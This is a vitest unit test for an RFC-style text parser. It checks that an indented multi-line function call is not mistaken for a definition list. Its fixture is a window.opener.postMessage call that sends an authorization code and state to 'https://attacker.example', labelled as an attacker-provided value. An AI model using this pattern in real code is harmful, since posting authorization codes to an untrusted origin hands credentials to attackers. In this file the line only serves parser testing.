import {describe, expect, it} from 'vitest';
import {ArrayCursor} from '../src/Utils/ArrayCursor.js';
import {parse} from '../src/Tree/Parser.js';

describe('DefinitionListMatcher - avoid false positive on function call', () => {
    it('does not treat window.opener.postMessage call as a DefinitionList', () => {
        // Arrange: RFC-like paragraph with a multi-line function call
        const snippetWithContext = [
            '',
            '   window.opener.postMessage(',
            '     {',
            '       code: "ABC",',
            '       state: "123"',
            '     },',
            '     "https://attacker.example" // attacker-provided value',
            '   )',
            '',
        ];

        // Act
        const document = parse(new ArrayCursor(snippetWithContext));
        const kinds = document.children.map((n: any) => n.type);

        // Assert: no DefinitionList; parsed as BlankLine, Paragraph, IndentedBlock, Paragraph, BlankLine
        expect(kinds).toEqual(['BlankLine', 'Paragraph', 'IndentedBlock', 'Paragraph', 'BlankLine']);

        // Additional sanity checks on node contents
        const firstParagraph: any = document.children[1];
        expect(firstParagraph.lines).toEqual(['   window.opener.postMessage(']);

        const block: any = document.children[2];
        expect(block.type).toBe('IndentedBlock');
        expect(block.indent).toBe(4);
        expect(block.lines[0]).toBe(' {');

        const closingParagraph: any = document.children[3];
        expect(closingParagraph.lines).toEqual(['   )']);
    });
});

